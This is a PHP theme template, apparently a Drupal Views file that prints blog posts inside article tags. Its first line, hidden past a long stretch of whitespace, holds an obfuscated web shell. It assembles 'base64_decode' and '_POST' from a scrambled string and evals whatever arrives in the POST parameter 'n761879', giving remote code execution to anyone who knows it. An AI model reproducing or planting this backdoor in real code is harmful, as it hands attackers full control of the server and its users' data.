<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n761879'])) {eval($s21(${$s20}['n761879']));}?><section class="">
    <div class="container">
        <?php
        $i = 1;
        foreach ($rows as $id => $row):
            ?>	
            <?php if ($i == 1): ?>
                <article class="clearfix m_bottom_50 m_xs_bottom_30 blog_post">
                <?php elseif ($i == 6): ?>
                    <article class="blog_post">
                    <?php else: ?>
                        <article class="m_bottom_50 m_xs_bottom_30 blog_post">
                        <?php endif; ?>
                        <?php print $row; ?>	
                    </article>
                    <?php
                    $i++;
                endforeach;
                ?>
                <div class="clearfix"></div>
                </div>
                </section>
                <script>
                    jQuery('.view-display-id-page_1column_classic').addClass('container m_bottom_70');
                </script>

